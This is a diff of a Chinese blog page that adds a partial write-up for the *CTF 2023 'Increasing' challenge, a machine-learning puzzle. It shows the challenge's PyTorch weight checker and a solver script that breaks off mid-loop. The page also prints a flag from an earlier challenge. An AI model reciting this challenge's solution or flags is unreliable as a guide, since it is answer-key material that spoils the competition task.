@@ -280,6 +280,18 @@
           </ul>
         </li>
         <li><a href="#mwm">MWM</a></li>
+        <li><a href="#increasing">Increasing</a></li>
+        <li><a href="#ray-tracing">ray tracing</a>
+          <ul>
+            <li><a href="#解法1官方wp">解法1(官方wp)</a></li>
+            <li><a href="#解法2-1">解法2</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#web">web</a>
+      <ul>
+        <li><a href="#jwt2struts">jwt2struts</a></li>
       </ul>
     </li>
   </ul>
@@ -408,7 +420,528 @@
 </span></span></code></pre></div><p><img src="https://gkjzjh146.github.io/2023_ctf.assets/image-20230801010943425.png" alt="image-20230801010943425"></p>
 <p>拿到flag</p>
 <pre tabindex="0"><code>*ctf{copy_right_at_JRrPC91IAG_2022_2023_all_rights_reserved}
-</code></pre><p>剩下明天再写。。。。</p>
+</code></pre><h2 id="increasing">Increasing</h2>
+<p>看不懂代码，借助gpt</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> func_timeout <span style="color:#f92672">import</span> func_set_timeout
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> torch
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> torch.nn <span style="color:#f92672">import</span> init
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> torch.nn <span style="color:#66d9ef">as</span> nn
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> copy <span style="color:#f92672">import</span> deepcopy
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> math
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>model_num<span style="color:#f92672">=</span><span style="color:#ae81ff">181</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#执行时间不超过60秒</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@func_set_timeout</span>(<span style="color:#ae81ff">60</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getinput60</span>():
+</span></span><span style="display:flex;"><span>    tmps<span style="color:#f92672">=</span>input()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> tmps
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#所有权重参数初始化为零</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">Net2Init</span>(tmpnet):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> key <span style="color:#f92672">in</span> tmpnet<span style="color:#f92672">.</span>state_dict():
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#e6db74">&#39;weight&#39;</span> <span style="color:#f92672">in</span> key):
+</span></span><span style="display:flex;"><span>            init<span style="color:#f92672">.</span>zeros_(tmpnet<span style="color:#f92672">.</span>state_dict()[key])
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            tmpnet<span style="color:#f92672">.</span>state_dict()[key][<span style="color:#f92672">...</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> tmpnet
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#用于找到输入张量 t 中最大值所在的索引</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#张量（Tensor）是一个多维数组（数组的推广），它可以表示任意数量的维度。在机器学习和深度学习中，张量是一种常见的数据结构，用于存储和表示多维的数值数据，例如图像、音频、文本等</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">max_label</span>(t):
+</span></span><span style="display:flex;"><span>    labellist <span style="color:#f92672">=</span> t<span style="color:#f92672">.</span>tolist()[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>    maxnum <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">10000</span>
+</span></span><span style="display:flex;"><span>    loc <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(len(labellist)):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (maxnum <span style="color:#f92672">&lt;</span> labellist[j]):
+</span></span><span style="display:flex;"><span>            loc <span style="color:#f92672">=</span> j
+</span></span><span style="display:flex;"><span>            maxnum <span style="color:#f92672">=</span> labellist[j]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> loc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#定义了一个名为 EasyNet 的神经网络模型类</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">EasyNet</span>(nn<span style="color:#f92672">.</span>Module):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#初始化 EasyNet 类的实例</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
+</span></span><span style="display:flex;"><span>        super(EasyNet, self)<span style="color:#f92672">.</span>__init__()
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>norm<span style="color:#f92672">=</span>nn<span style="color:#f92672">.</span>Softmax()
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>filter<span style="color:#f92672">=</span>nn<span style="color:#f92672">.</span>Linear(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>bypass <span style="color:#f92672">=</span> nn<span style="color:#f92672">.</span>Linear(<span style="color:#ae81ff">2</span>,model_num,bias<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#定义了前向传播函数 forward，用于定义神经网络的前向计算过程</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">forward</span>(self, x):
+</span></span><span style="display:flex;"><span>        x<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>filter(x)
+</span></span><span style="display:flex;"><span>        x<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>bypass(x)
+</span></span><span style="display:flex;"><span>        x<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>norm(x)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> x
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>namelist<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;filter.weight&#39;</span>, <span style="color:#e6db74">&#39;filter.bias&#39;</span>, <span style="color:#e6db74">&#39;bypass.weight&#39;</span>]
+</span></span><span style="display:flex;"><span>weightlist<span style="color:#f92672">=</span>[]
+</span></span><span style="display:flex;"><span>net<span style="color:#f92672">=</span>EasyNet()
+</span></span><span style="display:flex;"><span>mydict<span style="color:#f92672">=</span>net<span style="color:#f92672">.</span>state_dict()
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#创建了一个名为 net 的 EasyNet 类的实例</span>
+</span></span><span style="display:flex;"><span>net<span style="color:#f92672">=</span>Net2Init(net)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(namelist)):
+</span></span><span style="display:flex;"><span>    weightlist<span style="color:#f92672">.</span>append(mydict[namelist[i]]<span style="color:#f92672">.</span>tolist())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#最终weightlist 包含了神经网络 net 中 &#39;filter.weight&#39;、&#39;filter.bias&#39; 和 &#39;bypass.weight&#39; 这三个参数的权重值。</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#检查神经网络 tmpnet 在特定权重变化下是否满足一些条件</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">Increazing_check</span>(tmpnet,changelist):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,model_num<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#创建一个维度为1的张量 tmpinput，值为 i 的浮点数</span>
+</span></span><span style="display:flex;"><span>        tmpinput <span style="color:#f92672">=</span> torch<span style="color:#f92672">.</span>tensor([i <span style="color:#f92672">*</span> <span style="color:#ae81ff">1.0</span>])<span style="color:#f92672">.</span>reshape([<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>        tmpwl <span style="color:#f92672">=</span> deepcopy(weightlist)
+</span></span><span style="display:flex;"><span>        tmpdict <span style="color:#f92672">=</span> deepcopy(mydict)
+</span></span><span style="display:flex;"><span>        tmpcl<span style="color:#f92672">=</span>changelist[i]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(len(tmpcl)):
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">#当前权重变化情况的长度为3，表示这是对 weightlist 中的某个权重参数进行修改</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(len(tmpcl[j])<span style="color:#f92672">==</span><span style="color:#ae81ff">3</span>):
+</span></span><span style="display:flex;"><span>                a,b,c<span style="color:#f92672">=</span>tmpcl[j]
+</span></span><span style="display:flex;"><span>                tmpwl[a][b]<span style="color:#f92672">=</span>c
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">#当前权重变化情况的长度为4，表示这是对 weightlist 中的某个二维权重参数进行修改</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(len(tmpcl[j])<span style="color:#f92672">==</span><span style="color:#ae81ff">4</span>):
+</span></span><span style="display:flex;"><span>                a,b,c,d<span style="color:#f92672">=</span>tmpcl[j]
+</span></span><span style="display:flex;"><span>                tmpwl[a][b][c]<span style="color:#f92672">=</span>d
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(len(namelist)):
+</span></span><span style="display:flex;"><span>            tmpdict[namelist[j]] <span style="color:#f92672">=</span> torch<span style="color:#f92672">.</span>tensor(tmpwl[j])
+</span></span><span style="display:flex;"><span>        tmpnet<span style="color:#f92672">.</span>load_state_dict(tmpdict)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#类别索引不等于 i+1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(max_label(tmpnet(tmpinput))<span style="color:#f92672">!=</span>i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">Main</span>():
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;Please give me the weights!&#39;</span>)
+</span></span><span style="display:flex;"><span>    imgstr<span style="color:#f92672">=</span>getinput60()
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#将用户输入的权重数据按照竖线字符 | 进行拆分，得到一个列表 weightstr，其中每个元素都是一个字符串表示一个权重数据。</span>
+</span></span><span style="display:flex;"><span>    weightstr<span style="color:#f92672">=</span>imgstr<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;|&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(len(weightstr)<span style="color:#f92672">!=</span>model_num<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;Wrong model number!&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        format_ok<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>        changelist<span style="color:#f92672">=</span>[]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(weightstr)):
+</span></span><span style="display:flex;"><span>            tmpstr<span style="color:#f92672">=</span>weightstr[i]
+</span></span><span style="display:flex;"><span>            tmplist<span style="color:#f92672">=</span>[]
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">#按井号字符 # 将权重数据拆分成多个子项。</span>
+</span></span><span style="display:flex;"><span>            tmpchange<span style="color:#f92672">=</span>tmpstr<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;#&#39;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(len(tmpchange)):
+</span></span><span style="display:flex;"><span>                tmpweight<span style="color:#f92672">=</span>tmpchange[j]
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">#按逗号字符 , 将子项拆分成多个部分</span>
+</span></span><span style="display:flex;"><span>                tmpnum<span style="color:#f92672">=</span>tmpweight<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;,&#39;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">#将其解析为元组 (a, b, c, d)</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(len(tmpnum)<span style="color:#f92672">==</span><span style="color:#ae81ff">4</span>):
+</span></span><span style="display:flex;"><span>                    a,b,c,d<span style="color:#f92672">=</span>int(tmpnum[<span style="color:#ae81ff">0</span>]),int(tmpnum[<span style="color:#ae81ff">1</span>]),int(tmpnum[<span style="color:#ae81ff">2</span>]),float(tmpnum[<span style="color:#ae81ff">3</span>])
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span>(a<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> a<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">or</span> b<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> b<span style="color:#f92672">&gt;</span>model_num <span style="color:#f92672">or</span> c<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> c<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">or</span> math<span style="color:#f92672">.</span>isnan(d)):
+</span></span><span style="display:flex;"><span>                        format_ok<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>                    tmplist<span style="color:#f92672">.</span>append((a,b,c,d))
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">#将其解析为元组 (a, b, c)</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">elif</span>(len(tmpnum)<span style="color:#f92672">==</span><span style="color:#ae81ff">3</span>):
+</span></span><span style="display:flex;"><span>                    a,b,c<span style="color:#f92672">=</span>int(tmpnum[<span style="color:#ae81ff">0</span>]),int(tmpnum[<span style="color:#ae81ff">1</span>]),float(tmpnum[<span style="color:#ae81ff">2</span>])
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (a <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> a <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">or</span> b<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> b<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">or</span> math<span style="color:#f92672">.</span>isnan(c)):
+</span></span><span style="display:flex;"><span>                        format_ok <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>                    tmplist<span style="color:#f92672">.</span>append((a,b,c))
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                    format_ok<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>            changelist<span style="color:#f92672">.</span>append(tmplist)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(format_ok):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(Increazing_check(net,changelist)):
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#39;flag</span><span style="color:#e6db74">{test}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#39;Increazing failure!&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#39;Format error!&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    Main()
+</span></span></code></pre></div><p>简单来说就是要求输入模型参数，使第i个模型能将输入预测为i+1</p>
+<p>参考：</p>
+<p><a href="http://blog.xmcve.com/2023/07/31/starCTF-2023-Writeup/#title-7">*CTF 2023 Writeup - 星盟安全团队 (xmcve.com)</a></p>
+<p>测试的时候可以将数值改的小一点，这个完整跑一次时间很长，跑完结果保存在181.txt</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> torch
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> torch.nn <span style="color:#66d9ef">as</span> nn
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> torch.optim <span style="color:#66d9ef">as</span> optim
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># from func_timeout import func_set_timeout</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> torch
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> torch.nn <span style="color:#f92672">import</span> init
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> torch.nn <span style="color:#66d9ef">as</span> nn
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> copy <span style="color:#f92672">import</span> deepcopy
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> math
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>model_num <span style="color:#f92672">=</span> <span style="color:#ae81ff">181</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">Net2Init</span>(tmpnet):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> key <span style="color:#f92672">in</span> tmpnet<span style="color:#f92672">.</span>state_dict():
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#e6db74">&#39;weight&#39;</span> <span style="color:#f92672">in</span> key):
+</span></span><span style="display:flex;"><span>            init<span style="color:#f92672">.</span>zeros_(tmpnet<span style="color:#f92672">.</span>state_dict()[key])
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            tmpnet<span style="color:#f92672">.</span>state_dict()[key][<span style="color:#f92672">...</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> tmpnet
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">max_label</span>(t):
+</span></span><span style="display:flex;"><span>    labellist <span style="color:#f92672">=</span> t<span style="color:#f92672">.</span>tolist()[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>    maxnum <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">10000</span>
+</span></span><span style="display:flex;"><span>    loc <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(len(labellist)):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (maxnum <span style="color:#f92672">&lt;</span> labellist[j]):
+</span></span><span style="display:flex;"><span>            loc <span style="color:#f92672">=</span> j
+</span></span><span style="display:flex;"><span>            maxnum <span style="color:#f92672">=</span> labellist[j]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> loc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">EasyNet</span>(nn<span style="color:#f92672">.</span>Module):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
+</span></span><span style="display:flex;"><span>        super(EasyNet, self)<span style="color:#f92672">.</span>__init__()
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>norm <span style="color:#f92672">=</span> nn<span style="color:#f92672">.</span>Softmax()
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>filter <span style="color:#f92672">=</span> nn<span style="color:#f92672">.</span>Linear(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>bypass <span style="color:#f92672">=</span> nn<span style="color:#f92672">.</span>Linear(<span style="color:#ae81ff">2</span>, model_num, bias<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">forward</span>(self, x):
+</span></span><span style="display:flex;"><span>        x <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>filter(x)
+</span></span><span style="display:flex;"><span>        x <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>bypass(x)
+</span></span><span style="display:flex;"><span>        x <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>norm(x)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> x
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">180</span>):
+</span></span><span style="display:flex;"><span>    namelist <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;filter.weight&#39;</span>, <span style="color:#e6db74">&#39;filter.bias&#39;</span>, <span style="color:#e6db74">&#39;bypass.weight&#39;</span>]
+</span></span><span style="display:flex;"><span>    weightlist <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    net <span style="color:#f92672">=</span> EasyNet()
+</span></span><span style="display:flex;"><span>    mydict <span style="color:#f92672">=</span> net<span style="color:#f92672">.</span>state_dict()
+</span></span><span style="display:flex;"><span>    net <span style="color:#f92672">=</span> Net2Init(net)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i1 <span style="color:#f92672">in</span> range(len(namelist)):
+</span></span><span style="display:flex;"><span>        weightlist<span style="color:#f92672">.</span>append(mydict[namelist[i1]]<span style="color:#f92672">.</span>tolist())
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 定义训练数据和标签</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    inputs <span style="color:#f92672">=</span> torch<span style="color:#f92672">.</span>tensor([i <span style="color:#f92672">*</span> <span style="color:#ae81ff">1.0</span>])<span style="color:#f92672">.</span>reshape([<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>])  <span style="color:#75715e"># 输入数据</span>
+</span></span><span style="display:flex;"><span>    ss <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0.0</span> <span style="color:#66d9ef">for</span> i2 <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">181</span>)]
+</span></span><span style="display:flex;"><span>    ss[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1.0</span>
+</span></span><span style="display:flex;"><span>    labels <span style="color:#f92672">=</span> torch<span style="color:#f92672">.</span>tensor([ss])  <span style="color:#75715e"># 标签</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 创建模型实例</span>
+</span></span><span style="display:flex;"><span>    net <span style="color:#f92672">=</span> EasyNet()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 定义损失函数和优化器</span>
+</span></span><span style="display:flex;"><span>    criterion <span style="color:#f92672">=</span> nn<span style="color:#f92672">.</span>MSELoss()
+</span></span><span style="display:flex;"><span>    optimizer <span style="color:#f92672">=</span> optim<span style="color:#f92672">.</span>SGD(net<span style="color:#f92672">.</span>parameters(), lr<span style="color:#f92672">=</span><span style="color:#ae81ff">0.001</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 进行训练</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> epoch <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1000</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 清空梯度</span>
+</span></span><span style="display:flex;"><span>        optimizer<span style="color:#f92672">.</span>zero_grad()
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 前向传播</span>
+</span></span><span style="display:flex;"><span>        outputs <span style="color:#f92672">=</span> net(inputs)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># print(outputs)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># print(labels)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 计算损失</span>
+</span></span><span style="display:flex;"><span>        loss <span style="color:#f92672">=</span> criterion(outputs, labels)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 反向传播和优化</span>
+</span></span><span style="display:flex;"><span>        loss<span style="color:#f92672">.</span>backward()
+</span></span><span style="display:flex;"><span>        optimizer<span style="color:#f92672">.</span>step()
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 测试模型</span>
+</span></span><span style="display:flex;"><span>    tmp_input <span style="color:#f92672">=</span> torch<span style="color:#f92672">.</span>tensor([i <span style="color:#f92672">*</span> <span style="color:#ae81ff">1.0</span>])<span style="color:#f92672">.</span>reshape([<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>])  <span style="color:#75715e"># 输入数据</span>
+</span></span><span style="display:flex;"><span>    prediction <span style="color:#f92672">=</span> net(tmp_input)  <span style="color:#75715e"># 预测结果</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print(prediction)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 判断是否满足要求，max_label(net(tmp_input)) == i+1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> max_label(prediction) <span style="color:#f92672">==</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>        ss <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        filter_weight <span style="color:#f92672">=</span> net<span style="color:#f92672">.</span>state_dict()[<span style="color:#e6db74">&#39;filter.weight&#39;</span>]
+</span></span><span style="display:flex;"><span>        a <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>):
+</span></span><span style="display:flex;"><span>            d <span style="color:#f92672">=</span> round(float(filter_weight[b][c]), <span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>            ss <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>a<span style="color:#e6db74">}</span><span style="color:#e6db74">,</span><span style="color:#e6db74">{</span>b<span style="color:#e6db74">}</span><span style="color:#e6db74">,</span><span style="color:#e6db74">{</span>c<span style="color:#e6db74">}</span><span style="color:#e6db74">,</span><span style="color:#e6db74">{</span>d<span style="color:#e6db74">}</span><span style="color:#e6db74">#&#34;</span>
+</span></span><span style="display:flex;"><span>        filter_bias <span style="color:#f92672">=</span> net<span style="color:#f92672">.</span>state_dict()[<span style="color:#e6db74">&#39;filter.bias&#39;</span>]
+</span></span><span style="display:flex;"><span>        a <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>):
